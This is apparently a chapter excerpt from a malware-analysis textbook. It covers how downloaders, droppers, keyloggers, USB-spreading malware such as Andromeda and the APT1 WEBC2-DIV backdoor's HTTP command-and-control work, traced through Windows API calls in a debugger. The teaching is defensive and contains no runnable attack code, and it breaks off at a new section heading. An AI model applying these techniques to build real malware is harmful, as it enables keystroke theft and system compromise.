@@ -1,0 +1,810 @@
+<html><head></head><body>
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">Malware Functionalities and Persistence</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Malware can carry out various operations, and it can include various functionalities. Understanding what a malware does and the behavior it exhibits is essential to understanding the nature and purpose of the malicious binary. In the last few chapters, you learned the skills and tools necessary to perform malware analysis. In this chapter and the next few chapters, we will mainly focus on understanding different malware behaviors, their characteristics, and their capabilities.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1. Malware Functionalities</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">By now, you should have an understanding of how malware utilizes API functions to interact with the system. In this section, you will understand how malware makes use of various API functions to implement certain functionality. For information regarding where to find help about a particular API and how to read the API documentation, refer to section 3, <em class="calibre17">Disassembling the Windows API, </em>in <a href="part0146.html#4B7I40-ac10ba3f98854c44bac1c2c5641ca485" class="calibre10">Chapter 5</a>, <em class="calibre17"><span class="calibre7">Disassembly Using IDA</span>.</em></p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.1 Downloader</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">The simplest type of malware that you will encounter during malware analysis is a <em class="calibre17">Downloader</em>. A downloader is a program that downloads another malware component from the internet and executes it on the system. It does that by calling the <kbd class="calibre13">UrlDownloadToFile()</kbd> API, which downloads the file onto the disk. Once downloaded, it then uses either <kbd class="calibre13">ShellExecute()</kbd>, <kbd class="calibre13">WinExec()</kbd>, or <kbd class="calibre13">CreateProcess()</kbd> API calls to execute the downloaded component. Normally, you will find that downloaders are used as part of the exploit shellcode.</p>
+<p class="calibre2">The following screenshot shows a 32-bit malware downloader using <kbd class="calibre13">UrlDownloadToFileA()</kbd> and <kbd class="calibre13">ShellExecuteA()</kbd> to download and execute a malware binary. To determine the URL from where the malware binary is being downloaded, a breakpoint was set at the call to <kbd class="calibre13">UrlDownloadToFileA()</kbd>. After running the code, the breakpoint was triggered, as shown in the following screenshot. The second argument to <kbd class="calibre13">UrlDownloadToFileA()</kbd> shows the URL from where the malware executable (<em class="calibre17">wowreg32.exe</em>) will be downloaded, and the third argument specifies the location on the disk where the downloaded executable will be saved. In this case, the downloader saves the downloaded executable in the <kbd class="calibre13">%TEMP%</kbd> directory as <kbd class="calibre13">temp.exe</kbd>:</p>
+<div class="cdpaligncenter"><img src="../images/00172.jpeg" class="calibre169"/></div>
+<p class="calibre2">After downloading the malware executable into the <kbd class="calibre13">%TEMP%</kbd> directory, the downloader executes it by calling the <kbd class="calibre13">ShellExecuteA()</kbd> API, as shown in the following screenshot. Alternatively, malware may also use the <kbd class="calibre13">WinExec()</kbd> or <kbd class="calibre13">CreateProcess()</kbd> API to execute the downloaded file:</p>
+<div class="cdpaligncenter"><img src="../images/00173.jpeg" class="calibre170"/></div>
+<div class="packt_tip">While debugging the malicious binary, it is better to run monitoring tools (such as <em class="calibre22">Wireshark</em>) and simulation tools (such as <em class="calibre22">InetSim</em>), so that you can observe a malware's actions and capture the traffic it generates.</div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.2 Dropper</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">A <em class="calibre17">Dropper</em> is a program that embeds the additional malware component within itself. When executed, the dropper extracts the malware component and drops it to disk. A dropper normally embeds the additional binary in the resource section. To extract the embedded executable, a dropper uses the <kbd class="calibre13">FindResource()</kbd>, <kbd class="calibre13">LoadResource()</kbd>, <kbd class="calibre13">LockResource()</kbd> and <kbd class="calibre13">SizeOfResource()</kbd> API calls. In the following screenshot, the R<em class="calibre17">esource Hacker tool (covered in</em> <a href="part0032.html#UGI00-ac10ba3f98854c44bac1c2c5641ca485" class="calibre10">Chapter 2</a>, <em class="calibre17"><span class="calibre7">Static Analysis</span>)</em> shows the presence of a PE file in the resource section of a malware sample. In this case, the resource type is a DLL:</p>
+<div class="cdpaligncenter"><img src="../images/00174.jpeg" class="calibre171"/></div>
+<p class="calibre2">Loading the malicious binary in the x64dbg and looking at the references to the API calls (<em class="calibre17">covered in the previous chapter</em>) displays references to the resource-related API calls. This is an indication of malware extracting the content from the resource section. At this point, you can set a breakpoint on the address where the <kbd class="calibre13">FindResourceA()</kbd> API is called, as shown here:</p>
+<div class="cdpaligncenter"><img src="../images/00175.jpeg" class="calibre172"/></div>
+<p class="calibre2">In the following screenshot, after running the program, the execution is paused at the <kbd class="calibre13">FindResourceA()</kbd> API, due to the breakpoint set in the previous step. The second and third parameters passed to the <kbd class="calibre13">FindResourceA()</kbd> API tell you that the malware is trying to find the <kbd class="calibre13">DLL/101</kbd> resource, as follows:</p>
+<div class="cdpaligncenter"><img src="../images/00176.jpeg" class="calibre173"/></div>
+<p class="calibre2">After executing <kbd class="calibre13">FindResourceA(),</kbd> its return value (stored in <kbd class="calibre13">EAX</kbd>), which is the handle to the specified resource's information block, is passed as the second argument to the <kbd class="calibre13">LoadResource()</kbd> API. The <kbd class="calibre13">LoadResource()</kbd> retrieves the handle to the data associated with the resource. The return value of <kbd class="calibre13">LoadResource()</kbd>, which contains the retrieved handle, is then passed as the argument to the <kbd class="calibre13">LockResource()</kbd> API, which obtains the pointer to the actual resource. In the following screenshot, the execution is paused immediately after the call to <kbd class="calibre13">LockResource()</kbd>. Examining the return value (stored in <kbd class="calibre13">EAX</kbd>) in the dump window shows the PE executable content that was retrieved from the resource section:</p>
+<div class="cdpaligncenter"><img src="../images/00177.jpeg" class="calibre174"/></div>
+<p class="calibre2">Once it retrieves the resource, the malware determines the size of the resource (PE file) using the <kbd class="calibre13">SizofResource()</kbd> API. Next, the malware drops a DLL on the disk using <kbd class="calibre13">CreateFileA</kbd>, as follows:</p>
+<div class="cdpaligncenter"><img src="../images/00178.jpeg" class="calibre175"/></div>
+<p class="calibre2">The extracted PE content is then written to the DLL using the <kbd class="calibre13">WriteFile()</kbd> API. In the following screenshot, the first argument <kbd class="calibre13">0x5c</kbd> is the handle to the DLL, the second argument <kbd class="calibre13">0x00404060</kbd> is the address of the retrieved resource (PE File), and the third argument <kbd class="calibre13">0x1c00</kbd> is the size of the resource, which was determined using the call to <kbd class="calibre13">SizeOfResource()</kbd>:</p>
+<div class="cdpaligncenter"><img src="../images/00179.jpeg" class="calibre41"/></div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.2.1 Reversing a 64-bit Dropper</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">The following is an example of a 64-bit malware dropper (called <em class="calibre17">Hacker’s Door</em>). If you are not yet familiar with debugging 64-bit samples, refer to section <em class="calibre17">2.7, Debugging 64-bit Malware, </em>in the previous chapter. The malware uses the same set of API functions to find and extract the resource; the difference is that the first few parameters are placed in the registers and not pushed onto the stack (because it is a 64-bit binary). The malware first finds the <kbd class="calibre13">BIN/100</kbd> resource using the <kbd class="calibre13">FindResourceW()</kbd> API, as follows:</p>
+<div class="cdpaligncenter"><img src="../images/00180.jpeg" class="calibre41"/></div>
+<p class="calibre2">Then, the malware uses <kbd class="calibre13">LoadResource()</kbd> to retrieve the handle to the data associated with the resource, and it then uses <kbd class="calibre13">LockResource()</kbd> to obtain the pointer to the actual resource. In the following screenshot, examining the return value <kbd class="calibre13">(RAX)</kbd> of the <kbd class="calibre13">LockResource()</kbd> API shows the extracted resource. In this case, the 64-bit malware dropper extracts the DLL from its resource section, and later it drops the DLL onto the disk:</p>
+<div class="cdpaligncenter"><img src="../images/00181.jpeg" class="calibre41"/></div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.3 Keylogger</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">A <em class="calibre17">Keylogger</em> is a program that is designed to intercept and log keystrokes. Attackers use keylogging functionality in their malicious programs to steal confidential information (such as usernames, passwords, credit card information, and so on) entered via the keyboard. In this section, we will mainly focus on the user-mode software keyloggers. An attacker can log keystrokes using various techniques. The most common methods of logging keystrokes are using the documented Windows API functions: <em class="calibre17">(a) Checking the key state</em> (using the <kbd class="calibre13">GetAsyncKeyState()</kbd> API) and <em class="calibre17">(b) Installing Hooks</em> (using the <kbd class="calibre13">SetWindowHookEX()</kbd> API).</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.3.1 Keylogger Using GetAsyncKeyState()</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">This technique involves querying the state of each key on the keyboard. To do that, keyloggers make use of the <kbd class="calibre13">GetAsyncKeyState()</kbd> API function to determine whether the key is <em class="calibre17">pressed</em> or <em class="calibre17">not</em>. From the return value of <kbd class="calibre13">GetAsyncKeyState()</kbd>, it can be determined whether the key is up or down at the time the function is called and whether the key was pressed after a previous call to <kbd class="calibre13">GetAsyncKeyState()</kbd>. The following is the function prototype of the <kbd class="calibre13">GetAsyncKeyState()</kbd> API:</p>
+<pre class="calibre18">SHORT GetAsyncKeyState(int vKey);</pre>
+<p class="calibre2"><kbd class="calibre13">GetAsynKeyState()</kbd> accepts a single integer argument <kbd class="calibre13">vKey</kbd> which specifies one of <kbd class="calibre13">256</kbd> possible <em class="calibre17">virtual-key codes</em>. To determine the state of a single key on the keyboard, the <kbd class="calibre13">GetAsyncKeyState()</kbd> API can be called by passing the virtual-key code associated with the desired key as the argument. To determine the state of all the keys on the keyboard, a keylogger constantly polls the <kbd class="calibre13">GetAsyncKeyState()</kbd> API (by passing each virtual-key code as an argument) in a loop to determine which key is pressed.</p>
+<div class="packt_infobox">You can find the symbolic constant names associated with the virtual-key codes on the MSDN website (<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx" class="calibre20">https://msdn.microsoft.com/en-us/library/windows/desktop/dd375731(v=vs.85).aspx</a>).</div>
+<p class="calibre2">The following screenshot shows a code snippet from a keylogger. The keylogger determines the status of the <em class="calibre17">Shift </em>key (if it is up or down) by calling the <kbd class="calibre13">GetKeyState()</kbd> API at address <kbd class="calibre13">0x401441</kbd>. At address <kbd class="calibre13">0x401459</kbd>, the keylogger calls <kbd class="calibre13">GetAsyncKeyState()</kbd>, which is part of a loop, and in each iteration of the loop, the virtual-key code (which is read from the array of key codes) is passed as the argument to determine the status of each key. At address <kbd class="calibre13">0x401463</kbd>, a <kbd class="calibre13">test</kbd> operation (the same as the <kbd class="calibre13">AND</kbd> operation) is performed on the return value of <kbd class="calibre13">GetAsyncKeyState()</kbd> to determine if the <em class="calibre17">most significant bit</em> is set. If the most significant bit is set, it is an indication of the key being pressed. If a particular key is pressed, then the keylogger calls <kbd class="calibre13">GetKeyState()</kbd> at address <kbd class="calibre13">0x40146c</kbd> to check the status of the <em class="calibre17">Caps Lock</em> key (to check if it is turned on). Using this technique, malware can determine whether the upper case letter, lower case letter, number, or a special character was typed on the keyboard:</p>
+<div class="cdpaligncenter"><img src="../images/00182.jpeg" class="calibre41"/></div>
+<p class="calibre2">The following screenshot shows the end of the loop. From the code, you can tell that the malware iterates through the <kbd class="calibre13">0x5c (92)</kbd> key codes. In other words, it monitors <kbd class="calibre13">92</kbd> keys. <kbd class="calibre13">var_4</kbd>, in this case, acts as an <em class="calibre17">index</em> into an array of key codes to check, and it is incremented at the end of the loop, and as long as the value of <kbd class="calibre13">var_4</kbd> is less than <kbd class="calibre13">0x5c(92)</kbd>, the loop is continued:</p>
+<div class="cdpaligncenter"><img src="../images/00183.jpeg" class="calibre41"/></div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.3.2 Keylogger Using SetWindowsHookEx()</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Another common keylogger technique is where it installs a function (called <em class="calibre17">hook procedure</em>) to monitor keyboard events (such as <em class="calibre17">key press</em>). In this method, the malicious program registers a function (<em class="calibre17">hook procedure</em>) that will be notified when a keyboard event is triggered, and that function can log the keystrokes to a file or send them over the network. The malicious program uses the <kbd class="calibre13">SetWindowsHookEx()</kbd> API to specify what type of event to monitor (such as the keyboard, mouse, and so on) and the hook procedure that should be notified when a specific type of event occurs. The <em class="calibre17">hook procedure</em> can be contained within a DLL or the current module. In the following screenshot, the malware sample registers a hook procedure for the low-level keyboard event by calling <kbd class="calibre13">SetWindowsHookEx()</kbd> with the <kbd class="calibre13">WH_KEYBOARD_LL</kbd> parameter (malware may also use <kbd class="calibre13">WH_KEYBOARD</kbd>). The second parameter, <kbd class="calibre13">offset hook_proc</kbd>, is the <em class="calibre17">address of the hook procedure.</em> When the keyboard event occurs, this function will be notified. Examining this function will give an idea of how and where the keylogger logs keystrokes. The third parameter is the <em class="calibre17">handle</em> to the module (such as DLL or the current module) that contains the hook procedure. The fourth parameter, <kbd class="calibre13">0</kbd>, specifies that the hook procedure is to be associated with all existing threads in the same desktop:</p>
+<div class="cdpaligncenter"><img src="../images/00184.jpeg" class="calibre41"/></div>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.4 Malware Replication Via Removable Media</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">Attackers can spread their malicious program by infecting the removable media (such as a USB drive). An attacker can take advantage of <em class="calibre17">Autorun</em> features (or exploit the vulnerability in <em class="calibre17">Autorun</em>) to automatically infect other systems, when the infected media is plugged in to it. This technique typically involves copying files or modifying the existing files stored on the removable media. Once malware copies the malicious file to removable media, it can use various tricks to make that file look like a legitimate file to trick the user into executing it when the USB is plugged in to a different system. The technique of infecting removable media allows an attacker to spread their malware on disconnected or air-gapped networks.</p>
+<p class="calibre2">In the following example, malware calls <kbd class="calibre13">GetLogicalDriveStringsA()</kbd> to obtain the details of the valid drives on the computer. After the call to <kbd class="calibre13">GetLogicDriveStringsA()</kbd>, the list of available drives is stored in the output buffer <kbd class="calibre13">RootPathName</kbd>, which is passed as the second argument to <kbd class="calibre13">GetLogicalDriveStringsA()</kbd>. The following screenshot shows three drives, <kbd class="calibre13">C:\</kbd>, <kbd class="calibre13">D:\</kbd>, and <kbd class="calibre13">E:\</kbd>, after the call to <kbd class="calibre13">GetLogicDriveStringsA()</kbd>, where <kbd class="calibre13">E:\</kbd> is the USB drive. Once it determines the list of drives, it iterates through each drive to determine if it is a removable drive. It does that by comparing the return value of <kbd class="calibre13">GetDriveTypeA()</kbd> with <kbd class="calibre13">DRIVE_REMOVABLE</kbd> (constant value <kbd class="calibre13">2</kbd>):</p>
+<div class="cdpaligncenter"><img src="../images/00185.jpeg" class="calibre41"/></div>
+<p class="calibre2">If a removable media is detected, the malware copies itself (executable) into the removable media (USB drive) using the <kbd class="calibre13">CopyFileA()</kbd> API. To hide the file on removable media, it calls the <kbd class="calibre13">SetFileAttributesA()</kbd> API and passes it a constant value <kbd class="calibre13">FILE_ATTRIBUTE_HIDDEN</kbd>:</p>
+<div class="cdpaligncenter"><img src="../images/00186.jpeg" class="calibre176"/></div>
+<p class="calibre2">After copying the malicious file to removable media, the attacker can wait for the user to double-click on the copied file or can take advantage of <em class="calibre17">Autorun</em> features. Before Windows Vista, malware, apart from copying the executable file, also copied the <kbd class="calibre13">autorun.inf</kbd> file containing Autorun commands into the removable media. These Autorun commands allowed the attacker to start programs automatically (without user intervention) when the media was inserted into the system. Starting with Windows Vista, executing malicious binaries via Autorun is not possible by default, so an attacker has to use a different technique (such as modifying the registry entries) or exploit a vulnerability which could allow the malicious binary to execute automatically.</p>
+<p class="calibre2">Some malware programs rely on tricking the user to execute the malicious binary instead of taking advantage of Autorun features. <em class="calibre17">Andromeda</em> is an example of one such malware. To demonstrate the tricks used by Andromeda, consider the following screenshot, which shows the content of the 2 GB clean USB drive before plugging it into the system infected with Andromeda. The root directory of the USB consists of a file called <kbd class="calibre13">test.txt</kbd> and a folder named <kbd class="calibre13">testdir</kbd>:</p>
+<div class="cdpaligncenter"><img src="../images/00187.jpeg" class="calibre177"/></div>
+<p class="calibre2">Once the clean USB drive is inserted into the <em class="calibre17">Andromeda-</em>infected computer, it performs the following steps to infect the USB drive:</p>
+<ol class="calibre14">
+<li class="calibre12" value="1">It determines the list of all the drives on the system by calling <kbd class="calibre13">GetLogicalDriveStrings()</kbd>.</li>
+<li class="calibre12" value="2">The malware iterates through each drive and determines whether any drive is a removable media, using the <kbd class="calibre13">GetDriveType()</kbd> API.</li>
+</ol>
+<ol start="3" class="calibre14">
+<li class="calibre12" value="3">Once it finds the removable media, it calls the <kbd class="calibre13">CreateDirectoryW()</kbd> API to create a folder (directory) and passes an extended ASCII code <kbd class="calibre13">xA0 (á)</kbd> as the first parameter (directory name). This creates a folder called <kbd class="calibre13">E:\á</kbd> in the removable media, and due to the use of extended ASCII code, the folder is displayed with no name. The following screenshot shows the creation of the <kbd class="calibre13">E:\á</kbd> directory.  From now on, I will refer to this directory created by the malware as the <em class="calibre19">unnamed directory (folder)</em>:</li>
+</ol>
+<div class="cdpaligncenter">                  <img src="../images/00188.jpeg" class="calibre178"/></div>
+<p class="calibre2">The following screenshot shows the unnamed folder. This is the folder with the extended ascii code of xA0 <span class="calibre7">that was created in the previous step:</span></p>
+<div class="cdpaligncenter"><img src="../images/00189.jpeg" class="calibre179"/></div>
+<ol start="4" class="calibre14">
+<li class="calibre12" value="4">It then sets the attributes of the <em class="calibre19">unnamed folder</em> to hidden and makes it a protected operating system folder by calling the <kbd class="calibre13">SetFileAttributesW()</kbd> API. This hides the folder on the removable media:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00190.jpeg" class="calibre41"/></div>
+<ol start="5" class="calibre14">
+<li class="calibre12" value="5">Malware decrypts the executable content from the registry. It then creates a file in the unnamed folder. The created file name has the convention <kbd class="calibre13">&lt;randomfilename&gt;.1</kbd> and it writes the PE executable content (malicious DLL) to this file (using the <kbd class="calibre13">CreateFile()</kbd> and <kbd class="calibre13">WriteFile()</kbd> APIs). As a result, a DLL is created with the name <kbd class="calibre13">&lt;randomfilename&gt;.1</kbd> inside the unnamed folder, as shown here:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00191.jpeg" class="calibre41"/></div>
+<ol start="6" class="calibre14">
+<li class="calibre12" value="6">The malware then creates a <kbd class="calibre13">desktop.ini</kbd> file inside the <em class="calibre19">unnamed folder</em> and writes icon information to assign a <em class="calibre19">custom icon</em> to the unnamed folder. The content of <kbd class="calibre13">desktop.ini</kbd> is shown here:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00192.jpeg" class="calibre180"/></div>
+<p class="calibre26">The following screenshot displays the icon of the unnamed folder which has been changed to the drive icon. Also, note that the <em class="calibre17">unnamed folder</em> is now hidden. In other words, this folder will only be visible when the <em class="calibre17">folder options</em> are configured to show <em class="calibre17">hidden</em> and <em class="calibre17">protected</em> operating system files:</p>
+<div class="cdpaligncenter"><img src="../images/00193.jpeg" class="calibre181"/></div>
+<ol start="7" class="calibre14">
+<li class="calibre12" value="7">The malware then calls the <kbd class="calibre13">MoveFile()</kbd> API to move all the files and folders (in this case, <kbd class="calibre13">test.txt</kbd> and <kbd class="calibre13">testdir</kbd>) from the root directory to the <em class="calibre19">unnamed hidden folder</em>. After copying the user's files and folders, the root directory of the USB drive looks like the one shown here:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00194.jpeg" class="calibre182"/></div>
+<ol start="8" class="calibre14">
+<li class="calibre12" value="8">The malware then creates a shortcut link that points to <kbd class="calibre13">rundll32.exe</kbd>, and the parameter to <kbd class="calibre13">rundll32.exe</kbd> is the <kbd class="calibre13">&lt;randomfile&gt;.1</kbd> file (which was the DLL dropped in the <em class="calibre19">unnamed folder</em> earlier). The following screenshot displays the appearance of the shortcut file, and the properties showing the way a malicious DLL is loaded via rundll32.exe. In other words, when the shortcut file is double-clicked, the malicious DLL gets loaded via rundll32.exe, thereby executing the malicious code:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00195.jpeg" class="calibre183"/></div>
+<p class="calibre2">Using the aforementioned operations, <em class="calibre17">Andromeda</em> plays a psychological trick. Now, let's understand what happens when the user plugs in the infected USB drive on a clean system. The following screenshot shows the contents of the infected USB drive, which is displayed to the normal user (with default folder options). Notice that the <em class="calibre17">unnamed folder</em> is not visible to the user, and the user's files/folders <span class="calibre7">(in our case, </span><kbd class="calibre13">test.txt</kbd><span class="calibre7"> and </span><kbd class="calibre13">testdir</kbd><span class="calibre7">)</span> are missing from the root drive. The malware is tricking the user into believing that the shortcut file is a <em class="calibre17">drive:</em></p>
+<div class="cdpaligncenter"><img src="../images/00196.jpeg" class="calibre184"/></div>
+<p class="calibre2">When the user finds all the important files and folders missing from the USB root drive, the user is very likely to double-click on the shortcut file (thinking that it is a drive) to look for the missing files. As a result of double clicking the shortcut, <kbd class="calibre13">rundll32.exe</kbd> will load the malicious DLL from the <em class="calibre17">unnamed hidden folder</em> (not visible to the user) and infect the system.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.5 Malware Command and Control (C2)</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">The malware command and control (also called <em class="calibre17">C&amp;C</em> or <em class="calibre17">C2</em>) refers to how attackers communicate and exhibit control of the infected system. Upon infecting the system, most malware communicates with the attacker-controlled server (C2 server) either to take commands, download additional components, or to exfiltrate information. Adversaries use different techniques and protocols for command and control. Traditionally, <em class="calibre17">Internet Relay Chat (<span class="calibre7">IRC)</span></em> used to be the most common C2 channel for many years, but because IRC is not commonly used in organizations, it was possible to detect such traffic easily. Today, the most common protocol used by the malware for the C2 communication is <em class="calibre17">HTTP/HTTPS</em>. Using HTTP/HTTPS allows the adversary to bypass firewalls/network-based detection systems and to blend in with the legitimate web traffic. Malware may sometimes use a protocol such as P2P for C2 communication. Some malware have also used DNS tunneling (<a href="https://securelist.com/use-of-dns-tunneling-for-cc-communications/78203/" class="calibre10">https://securelist.com/use-of-dns-tunneling-for-cc-communications/78203/</a>) for C2 communications.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.5.1 HTTP Command and Control</h1>
+                
+            
+            <article>
+                
+<p class="calibre2">In this section, you will understand how adversaries use HTTP to communicate with the malicious program. The following is an example of a malware sample (<em class="calibre17">WEBC2-DIV</em> backdoor) used by the APT1 group (<a href="https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf" class="calibre10">https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/mandiant-apt1-report.pdf</a>). The malicious binary makes use of the <kbd class="calibre13">InternetOpen()</kbd>, <kbd class="calibre13">InternetOpenUrl()</kbd>, and <kbd class="calibre13">InternetReadFile()</kbd> API functions to retrieve a web page from an attacker-controlled C2 server. It expects the web page to contain special HTML tags; the backdoor then decrypts the data within the tags and interprets it as a command. The following steps describe the manner in which the <em class="calibre17">WEB2-DIV</em> backdoor communicates with the C2 to receive commands:</p>
+<ol class="calibre14">
+<li class="calibre12" value="1">First, the malware calls the <kbd class="calibre13">InternetOpenA()</kbd> API to initialize the connection to the internet. The first argument specifies the <em class="calibre19">User-Agent</em> the malware will use for the HTTP communication. This backdoor generates the User-Agent by concatenating the host-name of the infected systems (which it gets by calling the <kbd class="calibre13">GetComputerName()</kbd> API) with a hardcoded string. Whenever you come across a hardcoded <em class="calibre19">User-Agent</em> string used in the binary, it can make an excellent network indicator:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00197.jpeg" class="calibre185"/></div>
+<ol start="2" class="calibre14">
+<li class="calibre12" value="2">It then calls <kbd class="calibre13">InternetOpenUrlA()</kbd> to connect to a URL. You can determine the name of URL it connects to by examining the second argument as follows:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00198.jpeg" class="calibre186"/></div>
+<ol start="3" class="calibre14">
+<li class="calibre12" value="3">The following screenshot shows the network traffic generated after calling <kbd class="calibre13">InternetOpenUrlA()</kbd>. At this stage, the malware communicates with the C2 server to read the HTML content:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00199.jpeg" class="calibre187"/></div>
+<ol start="4" class="calibre14">
+<li class="calibre12" value="4">It then retrieves the content of the web page using the <kbd class="calibre13">InternetReadFile()</kbd> API call. The second argument to this function specifies the pointer to the buffer that receives the data. The following screenshot shows the HTML content retrieved after calling <kbd class="calibre13">InternetReadFile()</kbd>:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00200.jpeg" class="calibre41"/></div>
+<ol start="5" class="calibre14">
+<li class="calibre12" value="5">From the retrieved HTML content, the backdoor looks for specific content within the <em class="calibre19">&lt;div&gt;</em> HTML tag . The code performing the check for the content within a div tag is shown in the following screenshot. If the required content is not present, the malware does nothing and keeps periodically checking for the content:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00201.jpeg" class="calibre188"/></div>
+<p class="calibre26">To be specific, the malware expects the content to be enclosed within the <kbd class="calibre13">div</kbd> tag in a specific format such as the one shown in the following code. If the following format is found in the retrieved HTML content, its extracts the encrypted string <kbd class="calibre13">(KxAikuzeG:F6PXR3vFqffP:H)</kbd>, which is enclosed between <kbd class="calibre13">&lt;div safe: and balance&gt;&lt;/div&gt;</kbd>:</p>
+<pre class="calibre18">&lt;div safe: <strong class="calibre1">KxAikuzeG:F6PXR3vFqffP:H</strong> balance&gt;&lt;/div&gt;</pre>
+<ol start="6" class="calibre14">
+<li class="calibre12" value="6">The extracted encrypted string is then passed as the argument to a <em class="calibre19">decryption function</em>, which decrypts the string using a custom encryption algorithm. You will learn more about malware encryption techniques in <a href="part0271.html#82E8E0-ac10ba3f98854c44bac1c2c5641ca485" class="calibre10">Chapter 9</a>, <em class="calibre19"><span>Malware Obfuscation Techniques</span></em>. The following screenshot shows the decrypted string after calling <kbd class="calibre13">decryption function</kbd>. After decrypting the string, the backdoor checks if the first character of the decrypted string is <kbd class="calibre13">J</kbd>.  If this condition is satisfied, then the malware calls the <kbd class="calibre13">sleep()</kbd> API to sleep for a specific period. In short, the first character of the decrypted string acts as a command code, which tells the backdoor to perform the sleep operation:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00202.jpeg" class="calibre41"/></div>
+<ol start="7" class="calibre14">
+<li class="calibre12" value="7">If the first character of the decrypted string is <kbd class="calibre13">D</kbd>, then it checks if the second character is <kbd class="calibre13">o</kbd>, as shown here. If this condition is satisfied, then it extracts the URL starting from the third character and downloads an executable from that URL using <kbd class="calibre13">UrlDownloadToFile()</kbd>. It then executes the downloaded file using the <kbd class="calibre13">CreateProcess()</kbd> API. In this case, the first two characters, <kbd class="calibre13">Do</kbd>, act as the command code that tells the backdoor to download and execute the file:</li>
+</ol>
+<div class="cdpaligncenter"><img src="../images/00203.jpeg" class="calibre41"/></div>
+<div class="packt_infobox">For a full analysis of the <em class="calibre22">APT1 WEBC2-DIV</em> backdoor, check the author's Cysinfo meet presentation and video demo (<a href="https://cysinfo.com/8th-meetup-understanding-apt1-malware-techniques-using-malware-analysis-reverse-engineering/" class="calibre20">https://cysinfo.com/8th-meetup-understanding-apt1-malware-techniques-using-malware-analysis-reverse-engineering/</a>).</div>
+<p class="calibre2">Malware may also use APIs such as <kbd class="calibre13">InternetOpen()</kbd>, <kbd class="calibre13">InternetConnect()</kbd>, <kbd class="calibre13">HttpOpenRequest()</kbd>, <kbd class="calibre13">HttpSendRequest()</kbd>, and <kbd class="calibre13">InternetReadFile()</kbd> to communicate over HTTP. You can find analysis and reverse engineering of one such malware here: <a href="https://cysinfo.com/sx-2nd-meetup-reversing-and-decrypting-the-communications-of-apt-malware/" class="calibre10">https://cysinfo.com/sx-2nd-meetup-reversing-and-decrypting-the-communications-of-apt-malware/</a>.</p>
+<p class="calibre2">In addition to using HTTP/HTTPS, adversaries may abuse <em class="calibre17">social networks</em> (<a href="https://threatpost.com/attackers-moving-social-networks-command-and-control-071910/74225/" class="calibre10">https://threatpost.com/attackers-moving-social-networks-command-and-control-071910/74225/</a>), <em class="calibre17">legitimate sites</em> such as <em class="calibre17">Pastebin</em> (<a href="https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/" class="calibre10">https://cysinfo.com/uri-terror-attack-spear-phishing-emails-targeting-indian-embassies-and-indian-mea/</a>), and <em class="calibre17">cloud storage services</em> such as <em class="calibre17">Dropbox</em> (<a href="https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html" class="calibre10">https://www.fireeye.com/blog/threat-research/2015/11/china-based-threat.html</a>) for their malware command and control. These techniques make it difficult to monitor and detect malicious communications, and they allow an attacker to bypass network-based security controls.</p>
+
+
+            </article>
+
+            
+        </section>
+    
+
+        <section>
+
+                            <header>
+                    </header><h1 class="header-title" id="calibre_pb_0">1.5.2 Custom Command and Control</h1>
+                
+            
+            <article>
+                
